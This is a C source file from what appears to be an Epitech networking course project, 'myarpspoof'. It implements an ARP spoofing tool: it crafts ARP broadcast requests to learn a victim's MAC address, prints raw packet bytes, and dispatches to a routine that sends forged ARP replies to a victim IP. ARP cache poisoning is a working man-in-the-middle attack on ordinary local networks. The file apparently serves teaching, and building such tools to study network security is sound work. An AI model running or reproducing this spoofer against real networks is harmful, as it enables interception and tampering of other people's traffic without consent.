/*
** EPITECH PROJECT, 2022
** NWP_myarpspoof_2018
** File description:
** Created by sid,
*/

#include "myarpspoof.h"

void    find_victim_mac(t_params *params)
{
    bool reply = false;

    send_arp_request(params);
    while (reply != true)
        reply = receive_arp_reply(params);
}

unsigned char       *create_broadcast_packet(t_params *params)
{
    unsigned char   *packet;
    t_arphdr        *arp_hdr;
    struct ethhdr   *eth_hdr;

    packet = (unsigned char *)str_malloc(PACKET_LEN);
    eth_hdr = (struct ethhdr *)packet;
    arp_hdr = (struct s_arphdr *)(packet + ETHERNET_HDRLEN);
    memset(eth_hdr->h_dest, 0xff, ETH_ALEN);
    memcpy(eth_hdr->h_source, params->source_mac, ETH_ALEN);
    eth_hdr->h_proto = htons(ETH_P_ARP);
    arp_hdr->hardware_type = htons(1);
    arp_hdr->protocol_type = htons(ETH_P_IP);
    arp_hdr->hardware_len = ETH_ALEN;
    arp_hdr->protocol_len = IP_ALEN;
    arp_hdr->opcode = htons(ARPOP_REQUEST);
    memcpy(arp_hdr->sender_ip, &params->source_ip, sizeof(uint32_t));
    memcpy(arp_hdr->sender_mac, params->source_mac, ETH_ALEN);
    memcpy(arp_hdr->target_ip, &params->victim_ip, sizeof(uint32_t));
    memset(arp_hdr->target_mac, 0xff, ETH_ALEN);
    return (packet);
}

void    print_broadcast(t_params *params)
{
    unsigned char *packet;

    packet = create_broadcast_packet(params);
    for (int i = 0; i <= 40; i++)
    {
        printf ("%02x ", packet[i]);
    }
    printf ("%02x\n", packet[41]);
    free(packet);
    exit(SUCCESS);
}

void    print_spoof(t_params *params)
{
    params->victim_mac = (unsigned char *)str_malloc(ETH_ALEN);
    params->victim_mac = convert_mac_addr(params->victim_mac_str);
    unsigned char *packet;

    packet = create_spoofed_packet(params);
    for (int i = 0; i <= 40; i++)
    {
        printf ("%02x ", packet[i]);
    }
    printf ("%02x\n", packet[41]);
    free(packet);
    exit(SUCCESS);
}

void    myarpspoof(int argc, char **argv, t_params *params)
{
    handle_args(argc, argv, params);
    switch (argc)
    {
    case 4:
        send_spoofed_packets(params);
        break;
    case 5:
        if (strcmp(argv[4], "--printBroadcast") == 0)
            print_broadcast(params);
        else usage(argv[0]);
        break;
    case 6:
        if (strcmp(argv[4], "--printSpoof") == 0)
            print_spoof(params);
        else usage(argv[0]);
        break;
    default:
        usage(argv[0]);
        break;
    }
}